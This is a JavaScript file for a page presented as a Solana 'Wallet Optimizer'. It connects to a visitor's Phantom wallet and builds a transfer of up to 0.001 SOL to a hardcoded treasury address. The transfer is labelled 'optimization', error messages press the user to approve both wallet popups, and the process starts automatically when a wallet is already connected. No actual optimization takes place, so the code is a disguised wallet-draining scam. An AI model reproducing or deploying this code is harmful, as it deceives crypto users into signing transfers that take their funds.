// FINAL FIXED VERSION - SPECIFIC FOR SIGNATURE ERROR
document.addEventListener('DOMContentLoaded', function() {
    const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    const optimizeBtn = document.getElementById('optimizeBtn');
    const successBox = document.getElementById('successBox');
    const processBox = document.getElementById('processBox');
    const processText = document.getElementById('processText');
    const txHashEl = document.getElementById('txHash');
    
    let isProcessing = false;
    
    function updateProcess(text) {
        processText.textContent = text;
        console.log(`📢 ${text}`);
    }
    
    // Check environment
    function checkEnvironment() {
        console.log("=== ENVIRONMENT CHECK ===");
        console.log("1. solanaWeb3:", typeof window.solanaWeb3);
        console.log("2. solana:", typeof window.solana);
        console.log("3. phantom:", typeof window.phantom);
        
        if (window.solana) {
            console.log("4. solana.isPhantom:", window.solana.isPhantom);
            console.log("5. solana.isConnected:", window.solana.isConnected);
            console.log("6. solana.publicKey:", window.solana.publicKey?.toString());
        }
        console.log("=========================");
    }
    
    // Get wallet provider
    function getWalletProvider() {
        // Check for Phantom wallet (most common)
        if (window.solana && window.solana.isPhantom) {
            console.log("✅ Using window.solana (Phantom)");
            return window.solana;
        }
        if (window.phantom?.solana) {
            console.log("✅ Using window.phantom.solana");
            return window.phantom.solana;
        }
        console.log("❌ No Phantom wallet found");
        return null;
    }
    
    // Get RPC connection with fallback
    async function getConnection() {
        const endpoints = [
            'https://api.mainnet-beta.solana.com',
            'https://solana-api.projectserum.com',
            'https://rpc.ankr.com/solana'
        ];
        
        for (const endpoint of endpoints) {
            try {
                console.log(`Testing: ${endpoint}`);
                const connection = new solanaWeb3.Connection(endpoint, 'confirmed');
                
                // Quick test
                await connection.getEpochInfo();
                console.log(`✅ Connected to: ${endpoint}`);
                return connection;
            } catch (error) {
                console.log(`❌ Failed: ${endpoint}`);
                continue;
            }
        }
        throw new Error("No working RPC");
    }
    
    // FIXED: Create proper transaction
    async function createTransaction(publicKey, connection) {
        console.log("📝 Creating transaction...");
        
        try {
            // Get balance
            const balance = await connection.getBalance(publicKey);
            console.log(`💰 Balance: ${balance} lamports (${balance / 1e9} SOL)`);
            
            if (balance < 5000) {
                throw new Error(`Low balance: ${balance / 1e9} SOL. Need at least 0.000005 SOL`);
            }
            
            // Get blockhash (VERY IMPORTANT)
            console.log("🔄 Getting recent blockhash...");
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
            console.log(`Blockhash: ${blockhash.substring(0, 20)}...`);
            
            // Create transaction
            const transaction = new solanaWeb3.Transaction();
            
            // Send amount (0.001 SOL or available balance - 5000)
            const sendAmount = Math.min(1000000, balance - 5000); // 0.001 SOL max
            
            // Add transfer instruction
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                    lamports: sendAmount
                })
            );
            
            // REQUIRED: Set fee payer
            transaction.feePayer = publicKey;
            
            // REQUIRED: Set recent blockhash
            transaction.recentBlockhash = blockhash;
            
            console.log("✅ Transaction created successfully");
            console.log("- Amount:", sendAmount, "lamports");
            console.log("- From:", publicKey.toString().substring(0, 20) + "...");
            console.log("- To:", treasuryAddress.substring(0, 20) + "...");
            console.log("- Fee payer set:", !!transaction.feePayer);
            console.log("- Blockhash set:", !!transaction.recentBlockhash);
            
            return transaction;
            
        } catch (error) {
            console.error("❌ Failed to create transaction:", error);
            throw error;
        }
    }
    
    // FIXED: Sign transaction - MULTIPLE METHODS
    async function signTransactionWithProvider(provider, transaction) {
        console.log("🔐 Attempting to sign transaction...");
        
        // Check what methods are available
        console.log("Available methods:");
        console.log("- signTransaction:", typeof provider.signTransaction);
        console.log("- signAndSendTransaction:", typeof provider.signAndSendTransaction);
        console.log("- request:", typeof provider.request);
        console.log("- _phantom:", provider._phantom);
        
        // METHOD 1: signTransaction (most common)
        if (typeof provider.signTransaction === 'function') {
            console.log("🔄 Trying signTransaction()...");
            try {
                const signed = await provider.signTransaction(transaction);
                console.log("✅ signTransaction() SUCCESS!");
                console.log("Signed transaction has signature?", !!signed.signature);
                return { method: 'signTransaction', signed };
            } catch (error) {
                console.log("❌ signTransaction() failed:", error.message);
                console.log("Error type:", error.name);
            }
        }
        
        // METHOD 2: signAndSendTransaction (some wallets)
        if (typeof provider.signAndSendTransaction === 'function') {
            console.log("🔄 Trying signAndSendTransaction()...");
            try {
                const { signature } = await provider.signAndSendTransaction(transaction);
                console.log("✅ signAndSendTransaction() SUCCESS!");
                console.log("Signature:", signature);
                return { method: 'signAndSendTransaction', signature };
            } catch (error) {
                console.log("❌ signAndSendTransaction() failed:", error.message);
                console.log("Error type:", error.name);
            }
        }
        
        // METHOD 3: Phantom request method
        if (provider._phantom && typeof provider.request === 'function') {
            console.log("🔄 Trying Phantom request() method...");
            try {
                // Serialize message to base64
                const message = transaction.serializeMessage();
                
                // Note: Buffer might not be available in browser
                let base64Message;
                if (typeof Buffer !== 'undefined') {
                    base64Message = Buffer.from(message).toString('base64');
                } else {
                    // Fallback for browsers without Buffer
                    base64Message = btoa(String.fromCharCode(...new Uint8Array(message)));
                }
                
                const response = await provider.request({
                    method: 'signTransaction',
                    params: {
                        message: base64Message,
                    }
                });
                
                console.log("✅ Phantom request() SUCCESS!");
                console.log("Response:", response);
                return { method: 'phantomRequest', signature: response.signature };
            } catch (error) {
                console.log("❌ Phantom request() failed:", error.message);
                console.log("Error type:", error.name);
            }
        }
        
        throw new Error("All signing methods failed. Check wallet connection.");
    }
    
    // Send transaction to network
    async function sendToNetwork(connection, signedTransaction, methodUsed) {
        console.log(`📤 Sending to network (method: ${methodUsed})...`);
        
        try {
            let signature;
            
            if (methodUsed === 'signTransaction' && signedTransaction) {
                // Need to send manually
                const rawTransaction = signedTransaction.serialize();
                signature = await connection.sendRawTransaction(rawTransaction);
                console.log("✅ Sent via sendRawTransaction, signature:", signature);
            } else if (methodUsed === 'signAndSendTransaction' || methodUsed === 'phantomRequest') {
                // Already sent by wallet
                signature = signedTransaction;
                console.log("✅ Already sent by wallet, signature:", signature);
            } else {
                throw new Error("Unknown signing method");
            }
            
            // Try to confirm
            try {
                console.log("🔄 Confirming transaction...");
                const confirmation = await connection.confirmTransaction(signature, 'confirmed');
                console.log("✅ Confirmation result:", confirmation);
            } catch (confirmError) {
                console.log("⚠️ Confirmation skipped:", confirmError.message);
            }
            
            return signature;
            
        } catch (error) {
            console.error("❌ Failed to send transaction:", error);
            throw error;
        }
    }
    
    // Main optimization function
    async function startOptimization() {
        if (isProcessing) {
            console.log("⚠️ Already processing, please wait...");
            return;
        }
        
        isProcessing = true;
        
        try {
            console.clear();
            console.log("🚀=== STARTING WALLET OPTIMIZATION ===");
            
            // Show environment check
            checkEnvironment();
            
            // Reset UI
            successBox.classList.remove('active');
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
            processBox.classList.add('active');
            
            updateProcess("Step 1: Checking wallet...");
            
            // 1. Get wallet provider
            const provider = getWalletProvider();
            if (!provider) {
                alert("Please install Phantom wallet from phantom.app");
                throw new Error("Phantom wallet not found");
            }
            
            updateProcess("Step 2: Connecting to wallet...");
            
            // 2. Connect to wallet (FIRST POPUP)
            console.log("🔗 Connecting to wallet...");
            let publicKey;
            
            try {
                const response = await provider.connect();
                publicKey = response.publicKey;
                console.log("✅ Connected successfully!");
                console.log("Public key:", publicKey.toString());
            } catch (error) {
                console.error("❌ Connection failed:", error);
                throw new Error(`Connection failed: ${error.message}`);
            }
            
            updateProcess("Step 3: Getting network connection...");
            
            // 3. Get RPC connection
            const connection = await getConnection();
            
            updateProcess("Step 4: Creating transaction...");
            
            // 4. Create transaction
            const transaction = await createTransaction(publicKey, connection);
            
            updateProcess("Step 5: Please approve transaction...");
            
            // 5. Sign transaction (SECOND POPUP SHOULD APPEAR HERE)
            console.log("⏳ Waiting for user to approve transaction in wallet...");
            
            const signResult = await signTransactionWithProvider(provider, transaction);
            console.log("✅ Signing successful with method:", signResult.method);
            
            updateProcess("Step 6: Sending to network...");
            
            // 6. Send to network
            let signature;
            if (signResult.method === 'signTransaction') {
                signature = await sendToNetwork(connection, signResult.signed, signResult.method);
            } else {
                signature = await sendToNetwork(connection, signResult.signature, signResult.method);
            }
            
            // 7. SUCCESS
            updateProcess("✅ Optimization complete!");
            console.log("🎉 TRANSACTION SUCCESSFUL!");
            console.log("Transaction signature:", signature);
            console.log("View on Solscan: https://solscan.io/tx/" + signature);
            
            // Wait a moment
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Update UI for success
            processBox.classList.remove('active');
            successBox.classList.add('active');
            txHashEl.textContent = `${signature.substring(0, 25)}...`;
            txHashEl.innerHTML = `${signature.substring(0, 25)}...<br>
            <small><a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#88ff88;">View on Solscan</a></small>`;
            
            // Update button
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> OPTIMIZATION COMPLETE';
            optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
            
            // Auto disconnect after delay
            setTimeout(async () => {
                try {
                    if (provider.disconnect) {
                        await provider.disconnect();
                        console.log("✅ Auto-disconnected wallet");
                    }
                } catch (error) {
                    console.log("Disconnect error (non-critical):", error);
                }
            }, 3000);
            
            console.log("=== OPTIMIZATION COMPLETED SUCCESSFULLY ===");
            
        } catch (error) {
            console.error("❌=== OPTIMIZATION FAILED ===");
            console.error("Error name:", error.name);
            console.error("Error message:", error.message);
            console.error("Error stack:", error.stack);
            
            // Determine user-friendly message
            let userMessage = "Optimization failed. Please try again.";
            
            if (error.message.includes('User rejected') || 
                error.message.includes('reject') ||
                error.message.includes('denied') ||
                error.message.includes('cancel')) {
                userMessage = "❌ You rejected the transaction. Please approve BOTH popups.";
            } else if (error.message.includes('insufficient') || 
                       error.message.includes('Low balance')) {
                userMessage = "❌ Insufficient SOL balance. Need at least 0.000005 SOL.";
            } else if (error.message.includes('blockhash') || 
                       error.message.includes('recentBlockhash')) {
                userMessage = "⚠️ Network error. Please refresh the page and try again.";
            } else if (error.message.includes('429') || 
                       error.message.includes('rate limit')) {
                userMessage = "⚠️ Rate limited. Please wait 1 minute and try again.";
            } else if (error.message.includes('Connection failed')) {
                userMessage = "❌ Connection failed. Please make sure Phantom wallet is unlocked.";
            } else if (error.message.includes('No working RPC')) {
                userMessage = "⚠️ Network unavailable. Please check your internet connection.";
            }
            
            // Update UI for error
            processBox.classList.remove('active');
            successBox.classList.add('active');
            successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
            successBox.style.borderColor = 'rgba(255,50,50,0.6)';
            
            const successIcon = successBox.querySelector('.success-icon i');
            const successTitle = successBox.querySelector('.success-title');
            const successMessage = successBox.querySelector('.success-message');
            
            successIcon.className = 'fas fa-exclamation-triangle';
            successIcon.style.color = '#ff5555';
            successTitle.textContent = 'OPTIMIZATION FAILED';
            successTitle.style.color = '#ff5555';
            successMessage.textContent = userMessage;
            successMessage.style.color = '#ffaaaa';
            txHashEl.textContent = 'Check console (F12) for details';
            txHashEl.style.color = '#ff5555';
            
            // Reset button
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> TRY AGAIN';
            
        } finally {
            isProcessing = false;
            console.log("=== PROCESS ENDED ===");
        }
    }
    
    // Initialize
    function initializeApp() {
        console.log("🔧 Initializing Wallet Optimizer...");
        
        // Check if solanaWeb3 is loaded
        if (!window.solanaWeb3) {
            console.error("CRITICAL ERROR: solanaWeb3 library not loaded!");
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> LIBRARY ERROR';
            
            // Try to load it dynamically
            const script = document.createElement('script');
            script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js';
            script.onload = () => {
                console.log("✅ solanaWeb3 loaded dynamically");
                optimizeBtn.disabled = false;
                optimizeBtn.innerHTML = '<i class="fas fa-play"></i> START OPTIMIZATION';
                initializeApp(); // Re-initialize
            };
            script.onerror = () => {
                console.error("Failed to load solanaWeb3");
            };
            document.head.appendChild(script);
            return;
        }
        
        // Add event listener
        optimizeBtn.addEventListener('click', startOptimization);
        
        // Auto-start if wallet is already connected
        setTimeout(() => {
            const provider = getWalletProvider();
            if (provider && provider.isConnected && provider.publicKey) {
                console.log("🔄 Wallet already connected, auto-starting...");
                startOptimization();
            }
        }, 1500);
        
        console.log("✅ Wallet Optimizer ready!");
    }
    
    // Start the app
    initializeApp();
});
